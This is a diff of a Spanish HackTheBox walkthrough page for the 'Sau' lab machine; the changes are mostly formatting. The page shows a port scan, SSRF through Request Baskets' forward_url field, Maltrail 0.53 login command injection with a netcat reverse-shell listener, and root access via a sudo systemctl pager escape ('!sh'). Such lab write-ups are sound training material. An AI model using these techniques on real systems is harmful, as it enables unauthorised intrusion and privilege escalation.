@@ -85,7 +85,6 @@ Vamos a escanear los puertos de esta con Nmap:
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -94,7 +93,6 @@ Vamos a escanear los puertos de esta con Nmap:
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -165,7 +163,7 @@ Vamos a escanear los puertos de esta con Nmap:
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
 <p>Primero que todo vamos a empezar con el reconocimiento de la maquina:</p>
-<p>Vamos a escanear los puertos de esta con Nmap:</p>
+<p>Vamos a escanear los puertos de esta con <code>Nmap</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allports 10.10.11.224
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -187,18 +185,18 @@ Vamos a escanear los puertos de esta con Nmap:
 </span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.93 seconds
 </span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">72852</span> <span style="color:#f92672">(</span>3.205MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">72849</span> <span style="color:#f92672">(</span>2.914MB<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>Podemos comprobar que la maquina tiene el puerto 22 y el 55555 abiertos</p>
-<p>En el 55555 tiene alojada una web</p>
+</span></span></code></pre></div><p>Podemos comprobar que la maquina tiene el puerto <code>22</code> y el <code>55555</code> abiertos</p>
+<p>En el <code>55555</code> tiene alojada una web</p>
 <p><img src="/htb/Sau/images/1.png" alt="Sau"></p>
-<p>Esta pagina nos deja crear unas &ldquo;baskets&rdquo; con las cuales podemos inspeccionar las peticiones que se hagan a estas mismas por HTTP</p>
+<p>Esta pagina nos deja crear unas &ldquo;baskets&rdquo; con las cuales podemos inspeccionar las peticiones que se hagan a estas mismas por <code>HTTP</code></p>
 <p><img src="/htb/Sau/images/2.png" alt="Sau"></p>
 <h2 id="Explotación">Explotación SSRF</h2>
 <p>Después de buscar un rato te puedes dar cuenta que en el botón de configuración nos abre una pestaña en la cual podemos configurar la respuesta del servidor</p>
-<p>Si interceptamos esta petición con Burpsuite, podremos ver como se tramita esta misma</p>
+<p>Si interceptamos esta petición con <code>Burpsuite</code>, podremos ver como se tramita esta misma</p>
 <p><img src="/htb/Sau/images/3.png" alt="Sau"></p>
 <p>Después de buscar alguna vulnerabilidad que funcione para este caso encontré esta:</p>
 <p>Vulnerabilidad &mdash;&gt; <a href="https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3">https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3</a></p>
-<p>Aquí nos dice que usando el campo &ldquo;forward_url&rdquo; podemos ocasionar un SSRF</p>
+<p>Aquí nos dice que usando el campo &ldquo;forward_url&rdquo; podemos ocasionar un <code>SSRF</code></p>
 <p>Esto hará que cuando hagamos una petición a esta basket (en mi caso rugalo) nos mande a la url que pongamos en el campo &ldquo;forward_url&rdquo;</p>
 <p><em>Un apunte aquí es que es importante activar la respuesta del proxy, para que nos cargue la web que pusimos en es campo &ldquo;forward_url&rdquo;</em></p>
 <p>Ahora podemos poner en el campo &ldquo;forward_url&rdquo;  una url local (como puede ser 127.0.0.1):</p>
@@ -206,15 +204,15 @@ Vamos a escanear los puertos de esta con Nmap:
 <p>Si enviamos esta peticion y recargamos la pagina podemos ver que nos muestra una pagina web algo fea</p>
 <p><img src="/htb/Sau/images/5.png" alt="Sau"></p>
 <h2 id="Injection">Explotación Unauthenticated OS Command Injection</h2>
-<p>Podemos ver que esta web usa Maltrail, la version 0.53</p>
-<p>Si buscamos en internet por vulnerabilidades para esta version encontraremos un Unauthenticated OS Command Injection</p>
+<p>Podemos ver que esta web usa Maltrail, la version <code>0.53</code></p>
+<p>Si buscamos en internet por vulnerabilidades para esta version encontraremos un <code>Unauthenticated OS Command Injection</code></p>
 <p>Vulnerabilidad &mdash;&gt; <a href="https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/">https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/</a></p>
 <p>Esa vulnerabilidad nos permite hacer ejecución de comandos aprovechándose de el login, mas concretamente el campo username</p>
 <p>Por lo que podemos cambiar que estábamos poniendo en Burpsuite</p>
 <p><img src="/htb/Sau/images/6.png" alt="Sau"></p>
 <p>Buscando un poco mas encontré una herramienta que te automatiza la peticion para darte una reverse shell</p>
 <p>Script &mdash;&gt; <a href="https://github.com/spookier/Maltrail-v0.53-Exploit">https://github.com/spookier/Maltrail-v0.53-Exploit</a></p>
-<p>Si nos ponemos en escucha con Netcat por cualquier puerto:</p>
+<p>Si nos ponemos en escucha con <code>Netcat</code> por cualquier puerto:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4646</span>
 </span></span></code></pre></div><p>Y usamos esta herramienta de esta manera:</p>
 <ul>
@@ -238,17 +236,17 @@ Vamos a escanear los puertos de esta con Nmap:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>User puma may run the following commands on sau:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/systemctl status trail.service
-</span></span></code></pre></div><p>Después de buscar un rato en internet me encontré con esta manera de escalar privilegios</p>
+</span></span></code></pre></div><p>Después de buscar un rato en internet me encontré con esta manera de <code>escalar privilegios</code></p>
 <p>Pagina &mdash;&gt; <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/</a></p>
-<p>Según esto podemos ejecutar el systemctl como root, y a partir de ahí conseguir una bash</p>
+<p>Según esto podemos ejecutar el <code>systemctl</code> como root, y a partir de ahí conseguir una bash</p>
 <p>La manera de hacerlo seria poniendo este comando:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sudo /usr/bin/systemctl status trail.service
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>WARNING: terminal is not fully functional
 </span></span><span style="display:flex;"><span>-  <span style="color:#f92672">(</span>press RETURN<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>Sin presionar RETURN ponemos !sh</p>
+</span></span></code></pre></div><p>Sin presionar RETURN ponemos <code>!sh</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-  <span style="color:#f92672">(</span>press RETURN<span style="color:#f92672">)</span>!sh
-</span></span></code></pre></div><p>Esto nos dará una consola como administrador</p>
+</span></span></code></pre></div><p>Esto nos dará una consola como <code>administrador</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whoami
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root
